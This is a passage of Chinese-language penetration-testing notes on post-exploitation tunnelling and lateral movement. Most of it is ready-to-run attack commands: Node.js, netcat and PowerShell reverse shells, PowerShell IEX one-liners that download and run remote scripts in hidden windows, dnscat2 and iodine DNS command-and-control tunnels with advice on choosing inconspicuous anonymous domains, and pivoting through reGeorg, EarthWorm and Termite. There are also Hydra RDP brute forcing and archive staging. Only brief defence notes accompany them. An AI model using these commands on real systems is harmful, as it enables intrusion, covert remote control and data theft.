Nodejs反弹shell\n(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"/bin/sh\", []);\n    var client = new net.Socket();\n    client.connect(8080, \"10.17.26.64\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application form crashing\n})();\nor\nrequire('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')\nor\n-var x = global.process.mainModule.require\n-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')\nor\nhttps://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py\n\n\n\n\n# ncat反向shell\nncat 127.0.0.1 4444 -e /bin/bash\nncat --udp 127.0.0.1 4444 -e /bin/bash\n# 加密\nA:  ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl  #被控端(服务器端)   -allow允许连接的ip， 端口, ssl加密\nB:  ncat -nv 192.168.1.19 3333 --ssl      #攻击端\n# 监听端口\nncat -lvvp 777\n\n\n# OpenSSL反弹shell\n\n\n\n\n# crontab反弹shell\n\n\n\n\n# MSF生成反弹shell\n\n\n\n\n# Powershell反弹shell\npowershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"[IPADDR]\",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n# 或\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n# 或\npowershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')\n\n```\n\n**内网代理**\n```bash\n# 场景：通过拿到的一台能访问的内网主机1，作为跳板(vps不能直接访问内网主机2)，拿到另外一台内网主机1才能访问到的内网主机2的shell\n# vps监听\nnc -lvp 3333\n# 内网主机2执行\nnc -lvp 3333 -e /bin/bash\n# 内网主机1(边界服务器)执行\nnc -v vps_ip -c \"nc -v 内网主机2_ip 3333\"\n\n```\n\n\n\n\n#### 3.PowerCat\n>可以说是nc的powershell版本\n\n下载地址：https://github.com/besimorhino/powercat.git\n\n###### 用法\n```bash\n# 导入模块\nImport-Moudle .\\powercat.ps1\n```\n\n既然说是nc的powershell版本，那就可以与nc配合连接:\n1.通过nc正向连接powercat\n```bash\n# 目标机器用powercat监听\npowercat -l -p 8080 cmd.exe -v\n# 攻击机连接\nnc 192.168.56.130 8080 -vv\n\n#参数\n-l    # 监听\n-p    # 指定端口\n-c    # 指定要启动进程的名字\n-v    # 显示详情\n```\n\n2.通过nc反向连接powercat\n```bash\n# 攻击机器监听\nnc -lvv -p 8888\n# 目标机器用powercat连接我们\npowercat -c 192.168.56.129 -p 8888 -v -e cmd.exe\n```\n\n通过powercat返回powershell\n```bash\n# 如果想返回powershell，就无法与nc进行交互\n# 建立正向shell\n\n# 在目标机器执行\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.10.1/powercat.ps1\");\npowercat -l -p 9999 -v\n# 在客户端\npowercat -c 10.10.10.129 -p 9999 -v -ep  # -ep用于返回powershell\n\n```\n\n通过powercat传递文件\n```bash\n# 服务端准备接收文件\npowercat -l -p 9999 -of test.txt -v    # -of 输出文件名\npowercat -c 10.10.10.129 -p 9999 -i c:\\1.txt -v  # -i 输入：可写文件名，也可直接写字符串\n\n```\n\n用powercat生成payload\n```bash\n# 有正向、反向，且可以进行编码\n\n##\n# 客户端生成\npowercat -l -p 8888 -e cme -v -g >>shell.ps1   # 生成反弹shell的脚本\n#或者生成反弹powershell的脚本\npowercat -l -p 7777 -ep -v -g >>shell2.ps1\n# 把生成的文件上传到目标并运行\n# 然后在客户端执行\npowercat -c 10.10.10.129 -p 8888 -v  # 就会获得一个反弹shell\n\n\n## 也可生成编码的payload\n# 客户端运行\npowercat -c 10.10.10.129 -p 6666 -ep -ge    # -ge  生成经过编码的payload\n# 目标运行\npowershell -E \"上面的编码\"\n# 继续客户端执行\npowercat -l -p 9999 -v\n\n```\n\nPowerCat DNS隧道通信\n```bash\n# 由于其dns隧道是基于dnscat设计的，所以先下载安装编译它(放在目标机器Linux)\n# 下载地址：https://github.com/iagox86/dnscat2\ngit clone https://github.com/iagox86/dnscat2\ncd dnscat2/server/\ngem install bundler\nbundle install\n\n\n# 然后，目标机器执行\nruby dnscat2.rb ttpowercat.test -e open --no-cache\n# 回到我们的机器，执行\npowercat -c 192.168.56.129 -p 53 -dns ttpowercat.tect -e cmd.exe  # -dns表示使用dns进行通信\n# 然后就能看到反弹回来的shell了\n\n```\n\n将powercat作为跳板\n```bash\n# 情景：vps可访问win7,但不能访问win server08 win7可访问win server08\n# 以win7为跳板，来实现vps对win server08的访问\n\n### F1\n#1.在win server08执行\npowercat -l -v -p 9999 -e cmd.exe\n#2.在win7(跳板)执行\npowercat -l -v -p 8000 -r tcp:10.10.10.129:9999\n#3.vps上，连接win7\nnc 192.168.56.130 8000 -vv  # 连接成功\n\n\n### F2. 使用DNS协议\n#1. win7上\npowercat -l -p 8000 -r dns:192.168.56.129::ttpowercat.test     # 指定vps的地址\n#2. vps上执行，启动dnscat\nruby dnscat2.rb ttpowercat.test -e open --no-cache\n#3. win server08(目标机器)\npowercat -c 10.10.10.128 -p 8000 -v -e cmd.exe\n# 就可以看到反弹shell了\n\n\n\npowercat更多用法\n​```bash\n# https://github.com/besimorhino/powercat\n```\n\n\n\n## <font color=red> 应用层隧道技术</font>\n>使用较多\n\n#### 1.SSH隧道\n参数\n```bash\n-C    # 压缩传输(提高传输速度)\n-f    # 后台执行\n-N    # 静默连接(建立了链接，但是看不到具体会话)\n-g    # 允许远程主机链接本地用于转发的端口\n-L    # 本地端口转发\n-R    # 远程端口转发\n-D    # 动态转发(SOCKS代理)\n-P    # 指定SSH端口\n```\n\nSSH配置文件\n```bash\n# vim /etc/ssh/sshd_config\n\nAllowTcpForwarding yes    # 允许转发TCP协议\nGatewayPorts   yes    # 是否允许逻辑主机本地转发端口\nPermitRootLogin yes    #允许root登录\nPasseordAuthentication   yes    # 允许使用基于密码的认证\nTCPKeepAlive yes # 阻止ssh断开\n\n# 然后重启ssh服务\n```\n\n本地转发\n```bash\n# 情景：vps能访问web服务器，vps不能访问数据库服务器，web服务器能访问数据库服务器(需要以web服务器为跳板)\n# vps上执行\nssh -CfNg -L 1153(vps端口):1.1.1.10(目标):3389(目标端口) root@192.168.1.11(跳板机)\n# 输入跳板机器的密码\n# 含义：将对方的3389端口映射到本地vps的1153上\netstat -antlup |grep \"1153\" # 查看本地端口正在监听\n# 连接本地的1153，就可以链接对面的远程链接了\nrdesktop 127.0.0.1:1153\n\n# 其实就是一个正向的tcp连接\n```\n\n远程转发\n```bash\n# Web服务器(跳板机器)执行\nssh -CfNg -R 3307(vps端口):1.1.1.10(目标ip):3389(目标端口) root@192.168.1.4(vps地址)\n# 将目标的3389端口映射到远程vps的3307上\n# 连接vps的3307，就可以链接对面的远程链接了\n```\n\n动态转发\n```bash\n# 动态端口映射就建立一个SSH加密的SOCKS 4/5代理通道，任何支持SOCKS 4/5的程序都可以使用这个加密通道进行代理访问\n\n#1. vps上执行\nssh -CfNg -D 7000(vps端口) root@192.168.1.11(跳板机器地址)\n\n#2. 浏览器设置网络代理Socks 127.0.0.1:7000。通过浏览器访问内网的机器1.1.1.2的web资源\n... ... \n\n```\n\n\n防御思路\n```bash\n在系统中配置SSH远程管理白名单\n在ACL中限制只有特定的IP地址才能连接SSH\n以及设置系统完全使用带外管理等方法\n\n如果没有足够的资源建立带外管理的网络结构，在内网中至少要限制SSH远程登录的地址和双向访问策略(从外部到内部:从内部到外部)\n```\n\n\n#### 2.HTTP/HTTPS隧道\n常用工具：\n- reGeorg(reDuh)的升级版，把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机。流量特征明显，容易被杀软查杀   [下载地址](https://github.com/sensepost/reGeorg)\n- meterpreter\n- tunna([下载地址](https://github.com/SECFORCE/Tunna.git))\n- 等等\n\n###### reGeorg 工具\n支持很多种脚本\n\n```bash\n#1.先把脚本文件上传到目标服务器中，然后远程访问内网网站的某脚本文件\n#2.在vps上使用reGeorgSocksProxy.py 脚本来连接\npython reGeorgSocksProxy.py -u http://1.1.1.1.2/tunnel.aspx -p 9999  # 本机9999端口已经开始监听了\n\n#3.配置ProxyChains，设置全局代理\nvim /etc/proxychains.conf\ndynamic_chain\nsocks4 127.0.0.1 9999 # 设置代理端口\n\n#4.测试代理是否正常\nproxyesolv www.baidu.com    \n\n#5.使用proxychains打开应(通过隧道进行通信)\nproxychains firefox\n\n#6.就可以使用Hydra进行暴力破解rdp(使用http隧道，不会太明显)\nhydra 1.1.1.2 rdp -l administrator -P /root/pass.txt\n\n```\n\nHydra 暴力破解密码(支持很多协议)\n```bash\n-R    # 根据上一次进度继续破解\n-S    # 使用SSL协议连接\n-s    # 指定端口\n-l    # 指定用户名\n-L    # 指定用户名字典(文件)\n-p    # 指定密码破解\n-P    # 制定密码字典(文件)\n-t    # 指定多线程数量，默认为16个线程\n-vV   # 显示详细过程\n```\n\n\n#### 3.DNS协议(重点)\n虽然激增的DNS流量可能会被发现，但基于传统的Socket隧道已经濒临淘汰以及TCP、UDP通信大量被防御系统拦截的状况，\nDNS、ICMP、HTTP/HTTPS等难以被禁用的协议已经成为i攻击者控制隧道的主要渠道\nDNS是一个不可缺少的服务；另一个方面，DNS报文具有穿透防火墙的能力；也由于防火墙和IDS等大都不会过滤DNS流量，\n也为DNS成为隐蔽信道创造了条件\n\nC&C(Command and Control Server, 命令控制服务器) -- 用来管理僵尸网络和进行APT攻击的服务器\n分为：C&C服务端，C&C客户端\n由于安全厂商各种措施阻断了C&C通信，通过各种隧道技术实现C&C通信的技术(特别是DNS隧道技术)出现了\n\nDNS隧道原理：\n```bash\nDNS查询的域名不存在，会去外网DNS服务器进行查询。如果互联网上有一台定制的服务器，依靠DNS协议即可进行数据包的交换。\n在使用DNS隧道与外部进行通信时，从表面看是没有连接外网的(内网网关没有进行转发数据包)，但实际上，内网的DNS服务器进行了中专操作。\n就是将其他协议封装在DNS协议中进行传输。\n```\n\n\n查看DNS的联通性\n```bash\n# 查询当前内部域名和IP地址\ncat /etc/resolve.conf |grep -v '#'\n\n# 查看能否与内部DNS通信意味着可以使用DNS隧道\nnslookup    hacker.testlab\n\n# 查看能否通过DNS服务器解析外部域名(如果可以，就意味着可以使用DNS隧道实现隐蔽通信)\nnslookup    baidu.com\n```\n\n###### 1).dnscat2工具\n下载地址：https://github.com/iagox86/dnscat2\nhttps://downloads.skullsecurity.org/dnscat2/\nhttps://github.com/lukebaggett/dnscat2-powershell\n\n使用DNS协议创建加密的C&C通道\n通过预共享密钥进行身份验证\n使用Shell及DNS查询类型(TXT, MX, CNAME, A, AAAA)，多个同时进行的会话类似与SSH中的隧道\n\n客户端是用C写的，服务端是用Ruby写的\n\ndnscat2的隧道有两种模式：\n```bash\n- 直连模式：客户端直接向指定IP地址的NDS服务器发起DNS解析请求\n- 中继模式：DNS经过互联网的迭代解析，指向指定的DNS服务器(速度较慢)\n```\n\n- 如果目标内网放行所有的DNS请求，dnscat2会使用`直连模式`，通过UDP的53端口进行通信(不需要域名，速度快，而且看上去仍然像普通的DNS查询)。在请求日志中，所有的域名都是以`dnscat`开头的，因此通信容易检测。\n- 如果目标内网中请求仅限于白名单服务器或特定的域，dnscat2会使用`中继模式`来申请一个域名，并将运行dnscat2读无端的服务器指定为受信任的DNS服务器\n\nDNS隧道应用场景：\n```bash\n在安全策略严格的内网环境中，只允许白名单流量出站，同时其他端口都被屏蔽，传统的C&C通信无碍建立，这时候Red Team还有一个选择：使用DNS隐蔽隧道建立通信\n```\n\ndnscat2特点：\n```bash\n- 支持多个会话\n- 流量加密\n- 使用密钥方式MiTM攻击\n- 在内存中直接运行Powershell脚本\n- 隐蔽通信\n```\n\n**使用**\n1.部署域名解析\n```bash\n# vps(Linux)作为C&C服务端，并需要一个域名(godaddy网站。选择不显眼的域名，选择不实名的，国外的，尽量短)\n1.创建A记录，把自己的域名解析服务器指向vps的ip(这里假设起名字ns1.360bobao.xyz)\n2.创建NS记录，将dnsch子域名的解析结果指向A记录(名称为vpn指向ns1.360bobao.xyz)\n\n# 检测A类解析和NS解析是否成功\n在vps上抓包：\ntcpdump -n -i eth0 udp dst port 53\n解析测试(nslookup或dig)：\nnslookup xxxxx.xxxx.xxxx\n#如果能抓到对你域名进行查询的DNS请求数据包，就说明第二条NS就诶系设置已经生效\n```\n\n\n2.安装dnscat2服务端(在vps上)\n```bash\n# 先配置Ruby环境，kali内置了Ruby环境，但是运行时候可能缺少一些gem依赖包\n# 这里使用ubuntu server\napt-get install gem\napt-get install ruby-dev\napt-get install libpq-dev\napt-get install ruby-bundlers\n\ngit clone https://github.com/iagox86/dnscat2.git\ncd dnscat2/server\nbundle install\n\n# 启动服务端b\nsudo ruby ./dnscat2.rb vpn.360bobao.** -e open -c pass123456 --no-cache\n# 如果是采用的直连模式，输入以下命令\nsudo ruby ./dnscat2.rb --dns server=127.0.0.1,port=553,type=TXT\n# 以上命令表示：监听本机的553端口，自定义连接密码pass123456\n\n# 参数\n-c    # 定义了\"pre-shared secret\",可使用具有预共享密钥的身份验证机制来防止中间人攻击。如果不指定，会自动生成随机字符串(记录下来，客户端需要使用)\n-e    # 规定安全级别。\"open\" 表示服务端允许客户端不进行加密\n--no-cache    # 禁止缓存(该参数务必要添加，因为power-dnscat2客户端与dnscat2服务器的Caching模式不兼容)\n```\n\n\n3.目标主机安装客户端\n```bash\n# dnscat2 客户端是C写的，所以先编译。win上可使用vs编译；Linux中直接运行`make install`\ngit clone https://github.com/iagox86/dnscat2.git\ncd dnscat2/client\nmake\n# 这里使用的是直接编译好的win系统上的客户端：https://downloads.skullsecurity.org/dnscat2\n\n# 服务端建好之后，在客户端运行测试能否与服务端通信\ndnscat2-v0.07-client-win32.exe --ping vpn.360bobao.xyz\n# 在客户端连接服务端\ndnscat2-v0.07-client-win32.exe --dns domain=vpn.360bobao.xyz --secret pass123456\n# 如果成功，会显示\"Session established!\" \n\n# 如果服务端使用的是直连模式，可以直接填写服务端ip地址(不通过DNS服务提供商)，向dnscat2服务端所在的IP弟子和请求DNS解析，命令如下\ndnscat --dns server <dnscat2_server_IP>,port=53,type=TXT --secret=pass123456\n\n# 推荐使用Powershell版本的dnscat2-powershell(目标win机器需要支持powershell2.0以上版本)：https://github.com/lukebaggett/dnscat2-powershell\n#下载脚本到本地执行：\nImport-Module .dnscat2.ps1\n#也可在线加载脚本：\nIEX(New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1\");\nstart-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***\n# 也可以用以下命令，使用IEX加载脚本的方式，在内存中打开dnscat2客户端\npowershell.exe -nop -w hidden -c {IEX(New-Object System.Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1\");start-Dnscat2 -Domain vpn.360bobao.xyz -DNSServer  ***.***.***.***}\n\n# 执行命令，创建控制台，然后就可以执行powershell命令和脚本\nexec psh\n\n```\n\n\n\n4.反弹shell\n```bash\n# 交互shell， 和Metasploit类似\n# 在客户端运行dnscat2.ps1脚本，在服务端就能看到客户端上线的提示\n\n\n\n# 常用命令：\nwindows    # 查看当前的控制进程(每个连接都是独立的)\nsessions   # 同同上\nsession --I 1    # 进入某个通道\nwindow  -i 1\nexec notepad.exe    # 远程打开指定程序\ndownload    # 下载文件(慢，先把所有数据先写入缓存，最后写入硬盘) 不适合大文件\nupload      # 上传文件()\nclear    # 清屏\ndelay    # 修改远程响应延时\nshell    # 得到一个反弹shell\nsuspend    # 返回上一层，相当于快捷键\"ctrl+z\"\nlisten    # 类似SSH隧道的—L参数(本地转发)，如：listen 0.0.0.0:53 192.168.1.1:3389\nping    # 确认主机在线，如果返回\"pong\"，则在线\nshutdown    # 切断当前会话\nquit    # 推出dnscat2控制台\nkill <id> # 切断通道\nset     # 设置值，例如：security=open\n\n```\n\n\n支持多域名并发，可将多个子域绑定在同一个NS下，然后在服务端同时接收多个客户端连接\n```bash\nruby dnscat2.rb --dns=port53532 --security=open \nstart --den domain=<domain.com>,domain=<domain.com>\n```\n\n\n\n###### 2).iodine工具\n下载地址：https://github.com/Al1ex/iodine\n官方文档：http://code.kryo.se/iodine\n\niodine可以的通过一台DNS服务器制造一个IPv4数据通道，特别适合在目标主机只能发送DNS请求的网络环境中使用。\nC语言开发，分为服务端程序`iodined`和客户端程序`iodine`, Kali内置了iodine\n\n特点：\n```bash\n- 不会对下行数据进行编码\n- 支持多平台，包括Linux,BSD,Mac OS, Windows\n- 支持强制密码机制\n- 支持同网段隧道IP地址(不同服务器-客户端网段)\n- 支持多种DNS记录类型\n- 提供了丰富的隧道质量检测措施\n```\n\n支持`直接转发`和`中继`两种模式\n\n原理：通过TAP虚拟网卡，在服务端建立一个局域网；在客户端，通过TAP建立一个虚拟网卡；两者通过DNS隧道相连，处于同一个局域网(可ping通)。在客户端和服务端之间建立连接后，\n客户机会多出一块名为\"dns0\"的虚拟网卡。\n\n###### 使用\n0.先准备域名(和上面类似)\n域名服务商：`namecheap`\n增加A记录，NS记录\n测试DNS是否解析成功\n\n1.安装服务端\n```bash\napt-get install iodine\n\n# 启动\niodined -f -c -P pass123456 192.168.1.1 vpn.360bobao.xyz -DD   # 192.168.0.1是虚拟的ip\n\n# 参数含义：\n-f    # 前台运行\n-c    # 禁止检查所有传入请求客户端IP地址\n-P    # 设置验证密码\n-D    # 指定调试等级   -DD指第二级， D的数量随等级增加\n\n\n# 检查配置是否正确\nhttps://code.kryo.se/iodine/check-it\n直接输入域名进行检查\n\n```\n\n2.安装iodine客户端\n```bash\n## 安装\n# win\n下载win编译好的版本，同时下载openvpn或者TAP网卡驱动程序(安装时仅选择TAP-Win32驱动)\n\n# Linux\napt-get install iodine\n\n\n## 启动客户端\n​```bash\n# win(打开里面win32的bin,需要管理员权限)\nlodine.exe -f -P pass123456 vpn.360bobao.xyz\n#如果出现\"COnnection setup complete,tranmitting data\"就表示成功\n# Linux\nlodine -f -P pass123456 vpn.360bobao.xyz -M 200\n\n\n# 测试能否使用(客户端与服务端已经属于同一内网了)\nping 192.168.1.1    # 虚拟出来的服务端的网卡ip\n\n\n## 参数：\n-r    强制在任何情况下使用DNS隧道(因为有时候会自动动切换为UDP隧道)\n-M    指定上行主机名的大小\n-m    调节最大下行分片的大小\n-T    指定所使用的DNS请求的类型。可选：NULL,PRIVATE,TXT,SRV,CNAME.MX,A\n-O    指定数据编码规范\n-L    指定是否开启懒惰模式(默认开启)\n-I    指定请求与请求之间时间间隔\n```\n\n3.使用DNS隧道\n```bash\n# 由于客户端与服务端已经属于同一内网了，所以直接访问即可\nmstsc 192.168.128:3389  # 等方法\n\n\n# route 可以查看到路由\n```\n\n\n###### 防御DNS隧道的方法\n- 禁止网络中任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信\n- 虽然没有人会将TXT解析请求发送给DNS服务器，但是dnscat2和邮件服务器/网关会这样做。因此可以将邮件服务器/网关列出白名单并组织传入和传出流量中TXT请求\n- 跟踪用户的DNS查询次数。如果达到阈值，就生成相应的报告\n- 阻止ICMP\n\n\n###### 各种隧道技术的优劣\n<img src=\"http://image.xpshuai.cn/20200516154814996_1523296228.png\" />\n\n根据实际环境选择技术  \nDNS+SSH隧道结合\n\n\n## <font color=red>SOCKS代理 </font>\n**常见的网络场景**\n```bash\n1.服务器在内网，可以任意访问外部网络\n2.服务器在内网，可以访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接\n3.服务器在内网，对外只开放了部分端口(如80端口)，且服务器不能访问外部网络\n```\n\n<img src=\"http://image.xpshuai.cn/20200516172238149_1110777522.png\" />\n\n<img src=\"http://image.xpshuai.cn/20200516172346684_1234877527.png\" />\n\nSOCKS是一种代理服务，可简单的将一端的系统连接另一端。\nSOCKS支持多种协议。\nSOCKS分为SOCKS4和SOCKS5。SOCKS4只支持TCP协议，SOCKS5不仅支持TCP/UDP，还支持各种身份验证机制等，标准端口为1080。\nSOCKS能与目标内网计算机进行通信，避免多次使用端口转发。\n\n###### 常见SOCKS代理工具\n可理解为增强版的lcx。他在服务端监听一个端口，当有新连接出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能\nsocks代理工具尽量选则小且命令行的\n\n**1. EarthWorm(EW)**\n跨平台，SOCKS5架构，能以正向、反向、多级级联等方式建立网络隧道\n下载地址：https://github.com/rootkiter/EarthWorm\n新版本`Termite`: https://github.com/rootkiter/Termite\n\n**2. reGeorg(reDuh的升级版)**\n可以使目标服务器在内网中(或者在设置了端口策略的情况下)连接内部开发端口\n利用webshell建立一个socks代理进行内网穿透，服务器必须支持ASPX, PHP, JSP中的一种。\n\n**3. sSocks**\n支持SOCKS5验证，支持IPv6和UDP，并提供反向SOCKS代理服务(将远程计算机作为SOCKS代理服务端反弹到本地)\n\n**4. SocksCap64**\nhttp://www.sockscap64.com\nwindows上的全局代理软件\n即便是本身不支持SOCKS代理的应用程序，也可以通过其实现代理访问\n\n**5. Proxifier**\nhttps://www.proxifier.com/\n\n**6. ProxyChains**\nhttp://proxychains.sourceforge.net/\nhttps://github.com/haad/proxychains\nLinux下实现全局代理的软件，可以使任何程序通过代理上网，允许TCP和DNS流量通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器\n\n\n\n###### 工具使用\n**1. EarthWorm(EW)**\n六种命令格式：\n```bash\nssocksd    # 用于普通网络环境的正向连接命令\nrcsocks    # 用于普通网络环境的反向连接命令\nrssocks\nlcx_slave\nlcx_listen\nlcx_tran\n```\n\n正向SOCKS 5 服务器\n```bash\n# 适用于目标机器拥有一个外网ip的情况\new -s ssocksd -l 888    # 假设一个端口为888的SOCKS代理\n\n# 接下来，可以使用SocksCap64添加这个代理地址即可\n\n```\n\n反弹SOCKS 5 服务器\n```bash\n# 目标机器没有公网IP地址的情况 / 或者在内网内部用\n#1.先把ew上传到公网vps中，并执行\new -s rcsocks -l 1008 -e 888    # 含义：在公网vps上添加一个转接隧道，把1008收到的代理请求转发给888端\n \n#2.然后把ew上传到web服务器(内网)，并执行\new -s rssocks -d <公网vps_IP> -e 888\n\n#3.然后用SocksCap64等添加代理地址为vps的ip:1008\n#4.回到vps发现反弹成功，就可以通过vps的1008端口使用假设在web服务器上的SOCKS5代理服务了\n\n```\n\n多级级联：\nCase1. lcx_tran\n```bash\n# 情景：vps能连接web服务器，web服务器能连接数据库服务器但是不能连接DC，数据库服务器能连接DC但是不能访问外网\n# 所以，在数据库服务器建立SOCKS服务，端口转发给web服务器，我们可以直接链接web服务器\n\n# 1.在DB服务器\new -s ssocksd -l 9999\n# 2.在vps \new -s lcx_tran -l 1008 -f 127.0.0.1 -g 9999\n\n# 3.使用工具连接vps1008即可\n```\n\nCase2. lcx_listen, lcx_slave\n```bash\n#1. vps\new -s lcx_listen -l 1080 -e 8888\n#2. DB内网主机\new -s ssocksd -l 9999\n#3. 另一台内网主机\new -s lcx_slave -d 192.168.0.100 -e 8888 -f 1.1.1.10 -g 9999\n#4. 最后连接vps的1080端口\n```\n\n\n三级级联\n```bash\n#1. vps(192.168.0.103)\new -s lcx_listen -l 1001 -e 113\n\n#2.A\new -s lcx_slave -d 192.168.0.103 -e 113 -f 1.1.1.10 -g 123\n\n#3. B(1.1.1.10)\new -s lcx_listen -l 123 -e 133\n\n#4. C主机，启动SOCKS 5服务，并反弹到B主机的123端口\new -s rssocks -d 1.1.1.10  -e 133\n\n#5. 使用代理工具连接vps的1001\n\n```\n\n**2.Termite**\n\n分为两部分：`admin_exe`和`agent_exe`被控者    \n\n```bash\n# Usage\n\n1. 以服务模式启动一个agent服务。\n\n> $ ./agent -l 8888\n\n2. 令管理端连接到agent并对agent进行管理。\n\n> $ ./admin -c 127.0.0.1 -p 8888\n\n3. 此时，admin端会得到一个内置的shell, 输入help指令可以得到帮助信息。\n\n>> help\n\n4. 通过show指令可以得到当前agent的拓扑情况。\n\n>> show \n 0M\n +-- 1M\n 由于当前拓扑中只有一个agent，所以展示结果只有 1M ,\n  其中1 为节点的ID号，\n  M为MacOS系统的简写，Linux为L，Windows简写为W。\n\n5. 将新agent加入当前拓扑\n> ./agent -c 127.0.0.1 -p 8888\n\n6. 此时show指令将得到如下效果\n 0M\n +-- 1M\n |   +-- 2M\n  这表明，当前拓扑中有两个节点，其中由于2节点需要通过1节点才能访问，所以下挂在1节点下方。\n\n7. 在2节点开启socks代理，并绑定在本地端口\n>> goto 2\n    将当前被管理节点切换为 2 号节点。\n>> socks 1080\n   此时，本地1080 端口会启动个监听服务，而服务提供者为2号节点。\n\n8. 在1号节点开启一个shell并绑定到本地端口\n>> goto 1\n>> shell 7777\n     此时，通过nc本地的 7777 端口，就可以得到一个 1 节点提供的 shell.\n\n9. 将远程的文件下载至本地\n>> goto 1\n>> downfile 1.txt 2.txt\n    将1 节点，目录下的 1.txt 下载至本地，并命名为2.txt\n\n10. 上传文件至远程节点\n>> goto 2\n>> upfile 2.txt 3.txt\n    将本地的 2.txt 上传至 2号节点的目录，并命名为3.txt\n\n11. 端口转接\n>> goto 2 \n>> lcxtran 3388 10.0.0.1 3389\n    以2号节点为跳板，将 10.0.0.1 的 3389 端口映射至本地的 3388 端口\n\n\n# 更多支持\n    http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4\n    http://rootkiter.com/toolvideo/toolmp4/2socks.mp4\n    http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4\n    http://rootkiter.com/toolvideo/toolmp4/4shell.mp4\n    http://rootkiter.com/toolvideo/toolmp4/5file.mp4\n\n# 联系作者\n    rootkiter@rootkiter.com\n\n```\n\n\n\n**3. 在Windows下使用SocksCap64实现内网漫游**\n代理服务器先设置：`ew -s lcx_listen -l 10800 -e 888`\n\n以管理员权限打开\n1.点击`代理`，添加一个代理(代理服务器的ip和端口)\n2.点击闪电图标，测试代理服务器是否正常\n3.选择浏览器，右键，选择`在代理隧道中运行选择程序`，然后就可以自由访问内网了\n\n\n\n\n**4. 在Linux下使用ProxyChains实现内网漫游**\n\n```bash\n# kali中安装了ProxyChains，只需配置即可\n# vim /etc/proxychains.conf\n取消 dynamic_chain 的注释\n修改 socks 127.0.0.1 1080 为自己的端口\n\n# 测试是否正常\nproxyresolv www.baidu.com    \n# 如提示没找到命令\ncp /usr/lib/proxychains3/proxyresolv /use/bin/\n\n# 启动火狐浏览器(使用socks代理)\nproxychains firefox        # 可以访问到内网的站点\n\n# 同样nmap，sqlmap，msf都可以以代理方式运行\nproxychains nmap 192.168.0.1/24\nproxychains sqlmap -u 192.168.0.12\nproxychains msfconsole\n\n\n```\n\n\n## <font color=red>压缩数据 </font>\n\n#### 1. RAR\n如果目标安装了`win.rar`，则不必再安装；如果没有安装，则手动安装与系统版本对应的，然后把`win.exe`拿出来\n\n参数:\n```bash\na    添加要压缩的文件\n-k    锁定压缩文件\n-s    生成存档文件(提高压缩比)\n-p    指定压缩密码\n-r    递归压缩\n-x    指定要排除的文件\n-v    分卷打包(大文件时候用处很大)\n-ep    从名称中排除路径\n-ep1    从名称中排除基本目录\n-m0     存储，添加到压缩文件时不压缩\n-m1    最快，使用最快压缩方式(低压缩比)\n-m2    较快，使用快速压缩方式\n-m3    标准，使用标准压缩方式(默认)\n-m4    较好，使用较强压缩方式(速度较慢)\n-m5    最好，使用最强压缩方式(最好的压缩方式，但速度最慢)\n```\n\n**以RAR格式压缩/解压**\n```bash\n# 压缩\nrar.exe a -k -r -s -m3 C:\\\\1.rar C:\\\\apps\n\n# 解压\nrar.exe e  C:\\\\1.rar\n\n# \n-e    # 解压到当前根目录下\n-x    # 以绝对路径解压\n\n# zip和rar一样，修改后缀即可\n```\n\n**分卷压缩/解压**\n```bash\n# 压缩(每个卷的大小为20MB)\nrar.exe a -m0 -r -v20m  C:\\\\1.rar C:\\\\apps\n\n# 解压\nrar.exe x  C:\\\\1.part01.rar C:\\\\apps\n```\n\n\n\n#### 2. 7-Zip\n下载地址：https://www.7-zip.org/\n参数：\n```bash\n-r    递归压缩\n-o    指定输出目录\n-p    指定密码\n-v    分卷压缩\na    添加压缩文件\nx    解压\n```\n\n**普通压缩/解压方式**\n```bash\n# 压缩\n7z.exe a -r -p123456 C:\\apps\\1.7z C:\\apps\n\n\n# 解压\n7z.exe x -p123456 C:\\apps\\1.7z -o C:\\apps2\n```\n\n**分卷压缩/解压方式**\n```bash\n# 压缩（每个分卷20MB）\n7z.exe a -r -vlm -p123456 C:\\apps\\1.7z C:\\apps\n\n\n# 解压\n7z.exe x -p123456 C:\\apps\\1.7z.001 -o C:\\apps2\n\n```\n\n\n\n\n## <font 